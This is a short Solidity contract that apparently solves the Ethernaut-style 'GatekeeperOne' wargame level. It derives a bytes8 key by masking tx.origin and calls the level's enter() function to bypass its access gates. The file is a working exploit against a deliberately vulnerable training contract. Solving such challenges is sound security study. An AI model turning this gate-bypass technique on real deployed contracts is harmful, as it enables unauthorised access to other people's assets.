// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../levels/GatekeeperOne.sol";

contract GatekeeperOneAttack{
    uint public a;
    function att(address addr) public {
        bytes8 key = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;
        GatekeeperOne(addr).enter(key);
        a = gasleft();
    }
}
